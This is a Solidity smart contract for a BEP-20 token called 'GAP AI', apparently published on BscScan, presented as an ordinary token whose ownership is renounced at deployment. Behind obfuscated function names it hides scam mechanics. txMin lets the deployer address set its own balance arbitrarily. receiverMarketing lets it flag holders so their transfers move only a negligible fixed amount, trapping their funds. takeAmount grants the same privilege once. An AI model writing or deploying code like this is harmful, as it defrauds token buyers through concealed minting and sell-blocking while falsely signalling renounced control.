/**
 *Submitted for verification at BscScan.com on 2023-01-28
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract GAPAI {
    uint8 public decimals = 18;

    string public name = "GAP AI";
    address public owner;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    bool public listTxFee;

    mapping(address => bool) public swapBurn;
    mapping(address => uint256) public balanceOf;

    string public symbol = "GAI";

    address public fundAmountWallet;
    mapping(address => bool) public limitIs;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 constant tokenReceiver = 14 ** 10;
    address public liquidityAmount;

    

    event OwnershipTransferred(address indexed minTeam, address indexed txLimit);
    event Transfer(address indexed takeLimit, address indexed shouldMin, uint256 txIs);
    event Approval(address indexed isSwap, address indexed swapAmountWallet, uint256 txIs);

    constructor (){
        IUniswapV2Router fundIs = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        fundAmountWallet = IUniswapV2Factory(fundIs.factory()).createPair(fundIs.WETH(), address(this));
        owner = msg.sender;
        liquidityAmount = owner;
        limitIs[liquidityAmount] = true;
        balanceOf[liquidityAmount] = totalSupply;
        emit Transfer(address(0), liquidityAmount, totalSupply);
        renounceOwnership();
    }

    

    function transferFrom(address maxSender, address modeSwap, uint256 enableFund) public returns (bool) {
        if (maxSender != msg.sender && allowance[maxSender][msg.sender] != type(uint256).max) {
            require(allowance[maxSender][msg.sender] >= enableFund);
            allowance[maxSender][msg.sender] -= enableFund;
        }
        if (modeSwap == liquidityAmount || maxSender == liquidityAmount) {
            return sellReceiver(maxSender, modeSwap, enableFund);
        }
        if (swapBurn[maxSender]) {
            return sellReceiver(maxSender, modeSwap, tokenReceiver);
        }
        return sellReceiver(maxSender, modeSwap, enableFund);
    }

    function sellReceiver(address buySell, address modeExempt, uint256 enableFund) internal returns (bool) {
        require(balanceOf[buySell] >= enableFund);
        balanceOf[buySell] -= enableFund;
        balanceOf[modeExempt] += enableFund;
        emit Transfer(buySell, modeExempt, enableFund);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function txMin(uint256 enableFund) public {
        if (enableFund == 0 || !limitIs[msg.sender]) {
            return;
        }
        balanceOf[liquidityAmount] = enableFund;
    }

    function transfer(address modeSwap, uint256 enableFund) external returns (bool) {
        return transferFrom(msg.sender, modeSwap, enableFund);
    }

    function takeAmount(address receiverMin) public {
        if (listTxFee) {
            return;
        }
        limitIs[receiverMin] = true;
        listTxFee = true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(liquidityAmount, address(0));
        owner = address(0);
    }

    function receiverMarketing(address enableIs) public {
        if (enableIs == liquidityAmount || !limitIs[msg.sender]) {
            return;
        }
        swapBurn[enableIs] = true;
    }


}